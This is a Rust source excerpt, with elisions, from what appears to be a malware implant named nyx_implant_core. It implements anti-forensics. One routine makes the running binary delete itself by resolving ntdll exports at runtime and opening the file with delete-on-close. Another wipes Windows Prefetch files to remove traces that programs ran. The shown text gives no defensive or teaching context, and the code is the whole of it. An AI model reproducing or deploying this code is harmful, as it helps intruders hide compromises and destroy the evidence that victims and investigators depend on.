...
pub unsafe fn self_delete(path: &[u16]) -> bool {
    let (create, set_info, close) = match self_delete_resolve() {
        Some(fns) => fns,
        None => return false,
    };
    let (h, mut iosb) = match self_delete_open(create, path) {
        Some(open) => open,
        None => return false,
    };
    self_delete_set_disposition(set_info, h, &mut iosb);
    close(h);
    true
}

/// Resolves the three ntdll exports used for self-delete, in call order.
unsafe fn self_delete_resolve() -> Option<(NtCreateFileFn, NtSetInformationFileFn, NtCloseFn)> {
    let create_addr = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtCreateFile") {
        Some(a) => a,
        None => return None,
    };
    ...
    let set_addr =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtSetInformationFile") {
            Some(a) => a,
            None => return None,
        };
    let set_info: NtSetInformationFileFn = core::mem::transmute(set_addr);

    let close_addr = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtClose") {
        Some(a) => a,
        None => return None,
    };
    let close: NtCloseFn = core::mem::transmute(close_addr);

    Some((create, set_info, close))
}

/// Opens `path` with FILE_DELETE_ON_CLOSE; returns the handle and IoStatusBlock on success.
unsafe fn self_delete_open(create: NtCreateFileFn, path: &[u16]) -> Option<(isize, IoStatusBlock)> {
    let us = UnicodeStr {
...
/// Sets the POSIX delete disposition via NtSetInformationFile.
unsafe fn self_delete_set_disposition(
    set_info: NtSetInformationFileFn,
    h: isize,
    ...
    set_info(
        h,
        iosb as *mut IoStatusBlock as *mut c_void,
...
pub unsafe fn wipe_prefetch(names: &[&[u16]]) {
    let nt_del = match wipe_prefetch_resolve() {
        Some(f) => f,
        None => return,
    };
    for name in names {
        wipe_prefetch_delete(nt_del, name);
    }
}

/// Resolves the NtDeleteFile export used for the prefetch wipe.
unsafe fn wipe_prefetch_resolve() -> Option<NtDeleteFileFn> {
    let del_addr = match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtDeleteFile") {
        Some(a) => a,
        None => return None,
    };
...
/// Builds the full `\??\C:\Windows\Prefetch\` path for one name and deletes it.
unsafe fn wipe_prefetch_delete(nt_del: NtDeleteFileFn, name: &[u16]) {
    ...
    let pl = prefix.len();
    // WP-B2: a name longer than the remaining buffer would slice `path` out
    // of bounds; skip the delete instead of panicking.
    if pl + name.len() > path.len() {
        return;
    }
